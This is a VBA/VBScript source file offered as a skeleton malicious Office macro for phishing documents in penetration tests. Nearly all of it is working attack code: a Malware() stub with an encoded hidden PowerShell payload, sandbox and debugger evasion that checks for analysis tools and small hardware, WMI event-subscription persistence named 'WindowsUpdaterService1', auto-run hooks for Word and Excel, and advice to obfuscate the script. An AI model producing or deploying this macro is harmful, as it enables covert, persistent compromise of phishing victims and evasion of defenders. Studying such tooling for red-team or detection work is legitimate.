'
' RobustPentestMacro.vbs
'
' SYNOPSIS:
'   This is a skeleton code for the malicious Macro that could
'   be used during Penetration Testing assignments (or for education
'   purposes), in order to embed it within Phishing documents as a
'   Microsoft Office macro.
'
'   There are following features implemented:
'   - Sandbox detection - allowing to exit macro when being scanned
'   - WMI Subscription persistence - allowing to survive system restart
'   - Supporting both MSWORD and EXCEL startup routines
'
'
' QUICK USAGE:
'   Everything that one has to do with this script is to fill up the 
'   Malware() routine and if needed set up constants in CONFIGURATION.
'   One can use for the purpose of filling `Sub Malware()` predefined functions:
'       - CreateNewProcess(command)
'       - CreateNewProcessAndPersist command, startupTaskName
'
'   Finally, one should definitely feed this script into some kind of Visual
'   Basic obfuscator, like this one:
'       https://github.com/mgeeky/VisualBasicObfuscator
'
'   The macro's code has been built up from various building blocks:
'   - https://gist.github.com/mgeeky/d00ba855d2af73fd8d7446df0f64c25a
'   - https://gist.github.com/mgeeky/61e4dfe305ab719e9874ca442779a91d
'   - https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6
'
'
' DISCALIMER:
'   The author of this code is not taking any responsibilities of
'   any illegal usage of it. The code had been created solely for
'   Penetration Testing purposes.
'
'
' AUTHOR:
'   Mariusz B. / mgeeky, '17
'   Shared on GPL license.
'

Public alreadyLaunched As Integer
Private Declare PtrSafe Function isDbgPresent Lib "kernel32" Alias "IsDebuggerPresent" () As Boolean

'
' ================================================================
'   CONFIGURATION
'
' The most essential configuration here is the EXECUTE_COMMAND variable
' that has to contain a command to be launched upon execution. This
' command can be for instance "powershell -noP -sta -w 1 -enc <code>" payload
'
' Further options are documented below and are self-explanatory.
'

' Specifies whether to schedule below command EXECUTE_COMMAND at startup
' using WMI manipulation.
Const USE_WMI_PERSISTENCE = True

' Specifies whether to use Sandbox detection code and exit upon positive
' detection
Const USE_SANDBOX_DETECTION = True

'
' ================================================================
' MACRO CODE
'

Private Sub Malware()
    '
    ' ============================================
    '
    ' ENTER YOUR MALWARE CODE HERE.
    ' It will be started on auto open surely.
    '
    ' You can use following functions as building primitives:
    '   - CreateNewProcess(command)
    '   - CreateNewProcessAndPersist command, startupTaskName
    '
    ' ============================================

    Dim payload As String
    payload = "powershell -noP -sta -w 1 -enc "WwBSAGUAZgBdAC4AQQBTAFMAZQBNAGIAbAB5AC4ARwBFAHQA"
    payload = payload + "VAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AH"
    ' Rest of the payload, cut out for brevity
    ' [...]
    payload = payload + "fABJAEUAWAA="

    CreateNewProcessAndPersist payload, "WindowsUpdaterService1"

    ' ============================================

End Sub

Private Sub CreateNewProcess(ByVal str As String)
    Const HIDDEN_WINDOW = 0
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    objProcess.Create str, Null, objConfig, intProcessID

End Sub

Private Sub CreateNewProcessAndPersist(ByVal str As String, ByVal taskName As String)
    CreateNewProcess (str)
    If USE_WMI_PERSISTENCE = True Then
        WMIPersistence str, taskName
    End If
End Sub

Private Sub Launch()
    If alreadyLaunched = True Then
        Exit Sub
    End If
    If USE_SANDBOX_DETECTION = True Then
        If IsRunningInSandbox() Then
            Exit Sub
        End If
    End If
    Malware
    alreadyLaunched = True
End Sub

Public Function IsFileNameNotAsHexes() As Boolean
    Dim str As String
    Dim hexes As Variant
    Dim only_hexes As Boolean
    
    only_hexes = True
    hexes = Array("0", "1", "2", "3", "4", "5", "6", "7", _
                    "8", "9", "a", "b", "c", "d", "e", "f")
    str = ActiveDocument.Name
    str = Mid(str, 1, InStrRev(str, ".") - 1)
    
    For i = 1 To UBound(hexes, 1) - 1
        Dim ch As String
        ch = LCase(Mid(str, i, 1))
        If Not (UBound(Filter(hexes, ch)) > -1) Then
            ' Character not in hexes array.
            only_hexes = False
            Exit For
        End If
    Next
    
    only_hexes = (Not only_hexes)
    IsFileNameNotAsHexes = only_hexes
End Function

Public Function IsProcessListReliable() As Boolean
    Dim objWMIService, objProcess, colProcess
    Dim strComputer, strList
    Dim bannedProcesses As Variant
    
    bannedProcesses = Array("fiddler", "vxstream", _
        "tcpview", "vmware", "procexp", "vmtools", "autoit", _
        "wireshark", "procmon", "idaq", "autoruns", "apatedns", _
        "windbg")
    
    strComputer = "."

    Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" _
    & strComputer & "\root\cimv2")
    
    Set colProcess = objWMIService.ExecQuery _
    ("Select * from Win32_Process")
    
    For Each objProcess In colProcess
        For Each proc In bannedProcesses
            If InStr(LCase(objProcess.Name), LCase(proc)) <> 0 Then
                ' Found banned process.
                IsProcessListReliable = False
                Exit Function
            End If
        Next
    Next
    If isDbgPresent() Then
        IsProcessListReliable = False
        Exit Function
    End If
    IsProcessListReliable = (colProcess.Count() > 50)
End Function

Public Function IsHardwareReliable() As Boolean
    Dim objWMIService, objItem, colItems, strComputer
    Dim totalSize, totalMemory, cpusNum As Integer
    
    totalSize = 0
    totalMemory = 0
    cpusNum = 0
    
    Const wbemFlagReturnImmediately = &H10
    Const wbemFlagForwardOnly = &H20

    strComputer = "."
    
    ' Checking total HDD size
    Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colItems = objWMIService.ExecQuery _
    ("Select * from Win32_LogicalDisk")
    
    For Each objItem In colItems
        Dim num
        num = Int(objItem.Size / 1073741824)
        If num > 0 Then
            totalSize = totalSize + num
        End If
    Next
    
    If totalSize < 60 Then
        ' Total HDD size of the machine must be at least 60GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    ' Checking Memory
    Set colComputer = objWMIService.ExecQuery _
    ("Select * from Win32_ComputerSystem")
    
    For Each objComputer In colComputer
        totalMemory = totalMemory + Int((objComputer.TotalPhysicalMemory) / 1048576) + 1
    Next

    If totalMemory < 1024 Then
        ' Total Memory is less than 1GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    Set colItems2 = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL", _
        wbemFlagReturnImmediately + wbemFlagForwardOnly)
        
    For Each objItem In colItems2
        cpusNum = cpusNum + objItem.NumberOfLogicalProcessors
    Next
    
    If cpusNum < 2 Then
        ' Nowadays everyone has at least 2 logical cores.
        IsHardwareReliable = False
        Exit Function
    End If
    
    IsHardwareReliable = True
End Function

Public Function IsRunningInSandbox() As Boolean
    Dim test As Boolean
    If IsFileNameNotAsHexes() <> True Then
        IsRunningInSandbox = True
        Exit Function
    ElseIf IsProcessListReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    ElseIf IsHardwareReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    End If
    IsRunningInSandbox = False
End Function

Public Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    Dim filterName, consumerName As String
    Dim objLocator, objService1
    Dim objInstances1, objInstances2, objInstances3
    Dim newObj1, newObj2, newObj3
    
    On Error GoTo Failed
    
    filterName = taskName & "Event"
    consumerName = taskName & "Consumer"
    
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objService1 = objLocator.ConnectServer(".", "root\subscription")
    
    '
    ' Step 1: Set WMI Instance of type Event Filter
    '
    Set objInstances1 = objService1.Get("__EventFilter")

    ' The malware originally will kicks in after roughly 3 minutes since System gets up.
    ' One can modify this delay time by modifying the WHERE clausule of the below query.
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 " _
    & "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " _
    & "AND TargetInstance.SystemUpTime >= 200 AND " _
    & "TargetInstance.SystemUpTime < 320"
    
    ' New object of type __EventFilter
    Set newObj1 = objInstances1.SpawnInstance_
    newObj1.Name = filterName
    newObj1.eventNamespace = "root\cimv2"
    newObj1.QueryLanguage = "WQL"
    newObj1.Query = Query
    newObj1.Put_
    
    '
    ' Step 2: Set WMI instance of type: CommandLineEventConsumer
    '
    Set objInstances2 = objService1.Get("CommandLineEventConsumer")
    Set newObj2 = objInstances2.SpawnInstance_
    newObj2.Name = consumerName
    newObj2.CommandLineTemplate = exePath
    newObj2.Put_
    
    '
    ' Step 3: Set WMI instance of type: Filter To Consumer Binding
    '
    Set objInstances3 = objService1.Get("__FilterToConsumerBinding")
    Set newObj3 = objInstances3.SpawnInstance_
    newObj3.Filter = "__EventFilter.Name=""" & filterName & """"
    newObj3.Consumer = "CommandLineEventConsumer.Name=""" & consumerName & """"
    newObj3.Put_
    
    WMIPersistence = True
    Exit Function
Failed:
    WMIPersistence = False
End Function

Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub

Sub Auto_Open()
    ' Becomes launched as first on MS Excel
    Launch
End Sub

Sub Workbook_Open()
    ' Becomes launched as second, another try, on MS Excel
    Launch
End Sub
